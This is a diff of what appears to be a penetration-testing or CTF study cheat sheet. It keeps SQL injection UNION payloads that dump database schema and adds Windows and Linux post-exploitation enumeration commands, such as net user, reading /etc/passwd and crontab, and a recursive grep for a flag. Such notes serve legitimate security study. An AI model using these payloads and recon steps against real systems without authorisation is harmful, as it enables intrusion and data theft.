@@ -38,9 +38,53 @@ audi' UNION select 1,2,3,4,5#
 THIS IS THE GOLDEN STATEMENT >
 Audi'UNION select table_schema,table_name,column_name from information_schema.columns#
 
-## BUFFER OVERFLOW ##
+## LOCAL BUFFER OVERFLOW ##
+SEE DAY 5 FOR THIS INFO
 
-5 6 7 8
+## REMOTE BUFFER OVERFLOW ##
+SEE DAY 6 FOR THIS INFO
+
+## POST ENUMERATION ##
+
+#WINDOWS#
+ipconfig /all                                                  
+arp -a
+type C:\Windows\System32\Drivers\etc\hosts
+net user
+net localgroup
+net share
+systeminfo
+tasklist
+tasklist /svc (#SERVICES)
+netstat /anot
+(#VIEW HIDDEN ITEMS)
+schtasks (#USE THE GUI)
+
+#LINUX# 
+alias ll="ls -lisa"
+tip > YOU MIGHT NEED TO TCPDUMP.. USE NOT PORT TO FILTER OUT UNWANTED TRAFFIC
+
+whoami && hostname
+uname -a
+ip a
+ip n
+cat /etc/hosts
+ss -ntlp
+netstat -antop
+ps -elf
+cat /etc/crontab
+ls /etc/cron.d
+crontab -l
+cat /etc/passwd
+cat /etc/group
+cat /etc/rsyslog.conf
+(#IF IT HAS INCLUDE CONFIG CHECK ALL THAT IT INCLUDES)
+grep -Ril "Fl@g" /
+systemctl list-units --type service (#LAST PLACE TO CHECK)
+
+
+
+
 
 
 
